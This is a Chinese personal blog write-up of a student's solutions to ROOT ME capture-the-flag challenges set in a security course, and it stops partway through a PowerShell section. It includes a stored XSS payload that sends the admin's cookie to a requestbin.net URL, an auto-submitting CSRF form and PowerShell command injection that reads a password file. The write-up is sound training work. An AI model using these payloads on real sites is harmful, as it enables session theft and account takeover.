<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="专业课 - 信息安全 - 在 ROOT ME 平台上挑战信息安全项目" /><meta name="author" content="Stone SHI" /><meta property="og:locale" content="en" /><meta name="description" content="2021年9月28日，周二，专业课老师 Gorge 给我们在 ROOT ME 上开了一个竞赛，竞赛里提供了大量的计算机安全的题目来实践。" /><meta property="og:description" content="2021年9月28日，周二，专业课老师 Gorge 给我们在 ROOT ME 上开了一个竞赛，竞赛里提供了大量的计算机安全的题目来实践。" /><link rel="canonical" href="/posts/MSI-cyber-security/" /><meta property="og:url" content="/posts/MSI-cyber-security/" /><meta property="og:site_name" content="Stone SHI" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-09-28T15:23:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="专业课 - 信息安全 - 在 ROOT ME 平台上挑战信息安全项目" /><meta name="twitter:site" content="@Shuxin_Shi" /><meta name="twitter:creator" content="@Stone SHI" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Stone SHI"},"dateModified":"2021-12-21T17:45:35+08:00","datePublished":"2021-09-28T15:23:00+08:00","description":"2021年9月28日，周二，专业课老师 Gorge 给我们在 ROOT ME 上开了一个竞赛，竞赛里提供了大量的计算机安全的题目来实践。","headline":"专业课 - 信息安全 - 在 ROOT ME 平台上挑战信息安全项目","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/MSI-cyber-security/"},"url":"/posts/MSI-cyber-security/"}</script><title>专业课 - 信息安全 - 在 ROOT ME 平台上挑战信息安全项目 | Stone SHI</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Stone SHI"><meta name="application-name" content="Stone SHI"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://i.loli.net/2021/10/18/ZQlvsDd2akF9c1C.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Stone SHI</a></div><div class="site-subtitle font-italic">Personal blog used to record my learning, progress, and life.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/PPPPierre" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/Shuxin_Shi" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ssxhcxr4691059','163.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>专业课 - 信息安全 - 在 ROOT ME 平台上挑战信息安全项目</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>专业课 - 信息安全 - 在 ROOT ME 平台上挑战信息安全项目</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Stone SHI </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Sep 28, 2021, 3:23 PM +0800" >Sep 28, 2021<i class="unloaded">2021-09-28T15:23:00+08:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Dec 21, 2021, 10:45 AM +0100" >Dec 21, 2021<i class="unloaded">2021-12-21T17:45:35+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6177 words">34 min read</span></div></div><div class="post-content"><p>2021年9月28日，周二，专业课老师 Gorge 给我们在 ROOT ME 上开了一个竞赛，竞赛里提供了大量的计算机安全的题目来实践。</p><p>题目的形式多样，但是最终目标都是获取一个 code， 在题目页面上的输入框输入该 code 就可以得分。</p><h1 id="web---client">Web - Client</h1><h2 id="javascript---authentification">Javascript - Authentification</h2><p>提示语：Login &amp; pass ?</p><p>进入题目的网站显示的是一个登录界面，直接查看源码即可。</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="cm">/* &lt;![CDATA[ */</span>

<span class="kd">function</span> <span class="nx">Login</span><span class="p">(){</span>
	<span class="kd">var</span> <span class="nx">pseudo</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">login</span><span class="p">.</span><span class="nx">pseudo</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
	<span class="kd">var</span> <span class="nx">username</span><span class="o">=</span><span class="nx">pseudo</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">();</span>
	<span class="kd">var</span> <span class="nx">password</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">login</span><span class="p">.</span><span class="nx">password</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
	<span class="nx">password</span><span class="o">=</span><span class="nx">password</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">();</span>
	<span class="k">if</span> <span class="p">(</span><span class="nx">pseudo</span><span class="o">==</span><span class="dl">"</span><span class="s2">4dm1n</span><span class="dl">"</span> <span class="o">&amp;&amp;</span> <span class="nx">password</span><span class="o">==</span><span class="dl">"</span><span class="s2">sh.org</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
	    <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Password accepté, vous pouvez valider le challenge avec ce mot de passe.</span><span class="se">\n</span><span class="s2">You an validate the challenge using this password.</span><span class="dl">"</span><span class="p">);</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span> 
	    <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Mauvais mot de passe / wrong password</span><span class="dl">"</span><span class="p">);</span> 
	<span class="p">}</span>
<span class="p">}</span>
<span class="cm">/* ]]&gt; */</span> 
</pre></table></code></div></div><h2 id="javascript---authentification-2">Javascript - Authentification 2</h2><p>提示语：Oui oui, le javascript c’est très facile :)</p><p>同样也是查看网站源码即可</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">connexion</span><span class="p">(){</span>
    <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">prompt</span><span class="p">(</span><span class="dl">"</span><span class="s2">Username :</span><span class="dl">"</span><span class="p">,</span> <span class="dl">""</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">prompt</span><span class="p">(</span><span class="dl">"</span><span class="s2">Password :</span><span class="dl">"</span><span class="p">,</span> <span class="dl">""</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">TheLists</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">GOD:HIDDEN</span><span class="dl">"</span><span class="p">];</span>
    <span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">TheLists</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">TheLists</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">username</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">TheSplit</span> <span class="o">=</span> <span class="nx">TheLists</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="p">);</span>
            <span class="kd">var</span> <span class="nx">TheUsername</span> <span class="o">=</span> <span class="nx">TheSplit</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
            <span class="kd">var</span> <span class="nx">ThePassword</span> <span class="o">=</span> <span class="nx">TheSplit</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">username</span> <span class="o">==</span> <span class="nx">TheUsername</span> <span class="o">&amp;&amp;</span> <span class="nx">password</span> <span class="o">==</span> <span class="nx">ThePassword</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Vous pouvez utiliser ce mot de passe pour valider ce challenge (en majuscules) / You can use this password to validate this challenge (uppercase)</span><span class="dl">"</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Nope, you're a naughty hacker.</span><span class="dl">"</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>点击 loggin 会出现两个弹窗，分别输入账号密码，就会告诉你 Flag 就是你输入的密码。</p><h2 id="xss---stockée-1">XSS - Stockée 1</h2><p>提示语：Du gateau !</p><p>Énoncé Volez le cookie de session de l’administrateur et utilisez le pour valider l’épreuve.</p><p>涉及 XSS， 题目网站提供了类似于论坛留言板的界面，需要将代码注入留言板以获取管理员的 cookie 来解题。</p><p>利用 https://requestbin.net/ 生成一个 http 服务器来接受访问请求</p><p>知道服务器地址为 http://requestbin.net/r/5vds2u6y</p><p>在留言板输入以下内容</p><div class="language-html highlighter-rouge"><div class="code-header" text-data="html"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;img src=https://requestbin.net/r/5vds2u6y?tk=</span><span class="dl">"</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">+</span><span class="dl">"</span><span class="s2"> /&gt;</span><span class="dl">"</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>等待机器人定时访问留言板即可</p><p>https://www.cnblogs.com/li9club/p/12381847.html 生成服务器教程</p><h2 id="csrf---0-protection">CSRF - 0 protection</h2><p>提示语：Cross-Site Request Forgery</p><p>Énoncé Activez votre compte pour accéder à l’espace privé de l’intranet.</p><p>官方参考： http://repository.root-me.org/Exploitation%20-%20Web/FR%20-%20les%20attaques%20CSRF.pdf</p><p>http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20CSRF:%20Attack%20and%20defense.pdf</p><p>http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20Cross-site%20Request%20Forgery%20CSRF.pdf</p><p>https://requestbin.net/</p><p>解题：</p><p>点击 Register 注册一个账号，如 <code class="language-plaintext highlighter-rouge">attacker</code>，密码 <code class="language-plaintext highlighter-rouge">123456</code>。</p><p>chrome 查看 POST 请求 https://stackoverflow.com/questions/15603561/how-can-i-debug-a-http-post-in-chrome</p><p>看到这样一段代码</p><div class="language-html highlighter-rouge"><div class="code-header" text-data="html"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;title&gt;</span>Intranet<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;&lt;link</span> <span class="na">rel=</span><span class="s">'stylesheet'</span> <span class="na">property=</span><span class="s">'stylesheet'</span> <span class="na">id=</span><span class="s">'s'</span> <span class="na">type=</span><span class="s">'text/css'</span> <span class="na">href=</span><span class="s">'/template/s.css'</span> <span class="na">media=</span><span class="s">'all'</span> <span class="nt">/&gt;&lt;iframe</span> <span class="na">id=</span><span class="s">'iframe'</span> <span class="na">src=</span><span class="s">'https://www.root-me.org/?page=externe_header'</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"?action=contact"</span><span class="nt">&gt;</span>Contact<span class="nt">&lt;/a&gt;</span> | <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"?action=profile"</span><span class="nt">&gt;</span>Profile<span class="nt">&lt;/a&gt;</span> | <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"?action=private"</span><span class="nt">&gt;</span>Private<span class="nt">&lt;/a&gt;</span> | <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"?action=logout"</span><span class="nt">&gt;</span>Logout<span class="nt">&lt;/a&gt;&lt;hr&gt;</span>
<span class="nt">&lt;br&gt;&lt;br&gt;&lt;div&gt;</span>
		<span class="nt">&lt;fieldset&gt;&lt;legend&gt;</span>Update Profile<span class="nt">&lt;/legend&gt;</span>
		<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"?action=profile"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;label&gt;</span>Username:<span class="nt">&lt;/label&gt;</span>
		<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">value=</span><span class="s">"attacker"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;/div&gt;</span>
		<span class="nt">&lt;br&gt;</span>		
		<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;label&gt;</span>Status:<span class="nt">&lt;/label&gt;</span>
		<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"checkbox"</span> <span class="na">name=</span><span class="s">"status"</span> <span class="na">disabled</span> <span class="nt">&gt;</span>
		<span class="nt">&lt;/div&gt;</span>
		<span class="nt">&lt;br&gt;</span>	
		<span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>Submit<span class="nt">&lt;/button&gt;</span>
		<span class="nt">&lt;/form&gt;&lt;/fieldset&gt;</span>
		<span class="nt">&lt;/div&gt;&lt;div&gt;</span>You're not an admin!<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>写一段，主要思路是让 admin 打开收件箱之后到 http://challenge01.root-me.org/web-client/ch22/?action=profile 这个界面，然后自动执行对攻击者账号的 validation 的 POST 界面。</p><div class="language-html highlighter-rouge"><div class="code-header" text-data="html"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">"csrf"</span> <span class="na">action=</span><span class="s">"http://challenge01.root-me.org/web-client/ch22/?action=profile"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">value=</span><span class="s">"attacker"</span><span class="nt">&gt;</span> <span class="c">&lt;!-- 激活账号，根据实际修改 --&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"status"</span> <span class="na">value=</span><span class="s">"on"</span><span class="nt">&gt;</span> <span class="c">&lt;!-- 激活动作 --&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">csrf</span><span class="p">.</span><span class="nx">submit</span><span class="p">()</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>参考：</p><p>https://www.douban.com/note/714091211/</p><p>https://exp-blog.com/safe/ctf/rootme/web-client/csrf-0-protection/</p><h1 id="app---script">App - Script</h1><h2 id="powershell---command-injection">Powershell - Command injection</h2><div class="language-shell highlighter-rouge"><div class="code-header" text-data="shell"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="o">[</span>Press Shift-F1 <span class="k">for </span><span class="nb">help</span><span class="o">]</span>

Host/IP or ssh:// URL <span class="o">[</span>localhost]: ssh://app-script-ch18:app-script-ch18@challen
ge05
Connecting to ssh://app-script-ch18@challenge05:22

load pubkey <span class="s2">"/dev/null/.ssh/id_rsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_rsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_dsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_dsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_xmss"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_xmss"</span>: Not a directory
      _           _ _                        ___  ____
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ <span class="se">\|</span> ___|
 / __| <span class="s1">'_ \ / _` | | |/ _ \ '</span>_ <span class="se">\ </span>/ _<span class="sb">`</span> |/ _ <span class="se">\ </span>| | |___ <span class="se">\</span>
| <span class="o">(</span>__| | | | <span class="o">(</span>_| | | |  __/ | | | <span class="o">(</span>_| |  __/ |_| |___<span class="o">)</span> |
 <span class="se">\_</span>__|_| |_|<span class="se">\_</span>_,_|_|_|<span class="se">\_</span>__|_| |_|<span class="se">\_</span>_, |<span class="se">\_</span>__|<span class="se">\_</span>__/|____/
                                 |___/ root-me.org

ConvertFrom-SecureString : The data protection operation was unsuccessful.

This may have been caused by not having the user profile loaded <span class="k">for </span>the

current thread<span class="s1">'s user context, which may be the case when the thread is

impersonating.

+                                                  ~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [ConvertFrom-SecureString], Cr

   yptographicException
    + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept

   ion,Microsoft.PowerShell.Commands.ConvertFromSecureStringCommand

Table to dump:
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header" text-data="powershell"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="p">;</span><span class="n">ls</span><span class="w">
</span><span class="nx">Connect</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">database</span><span class="w"> </span><span class="nx">With</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">secure</span><span class="w"> </span><span class="nx">Password:</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="nx">Backup</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">table</span><span class="w">

    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\cygwin64\challenge\app-script\ch18</span><span class="w">

</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">4</span><span class="n">/20/2020</span><span class="w">  </span><span class="nx">10:50</span><span class="w"> </span><span class="nx">AM</span><span class="w">             </span><span class="nx">18</span><span class="w"> </span><span class="o">.</span><span class="nf">passwd</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="nx">4/21/2020</span><span class="w">  </span><span class="nx">11:37</span><span class="w"> </span><span class="nx">AM</span><span class="w">            </span><span class="nx">314</span><span class="w"> </span><span class="nx">ch18.ps1</span><span class="w">
</span><span class="n">Table</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">dump:</span><span class="w">
</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header" text-data="powershell"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="p">;</span><span class="n">Get-content</span><span class="w"> </span><span class="o">.</span><span class="nf">passwd</span><span class="w">
</span><span class="nx">Connect</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">database</span><span class="w"> </span><span class="nx">With</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">secure</span><span class="w"> </span><span class="nx">Password:</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="nx">Backup</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">table</span><span class="w">
</span><span class="n">SecureIEXpassword</span><span class="w">
</span><span class="nx">Table</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">dump:</span><span class="w">
</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><h2 id="powershell---securestring">Powershell - SecureString</h2><div class="language-powershell highlighter-rouge"><div class="code-header" text-data="powershell"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
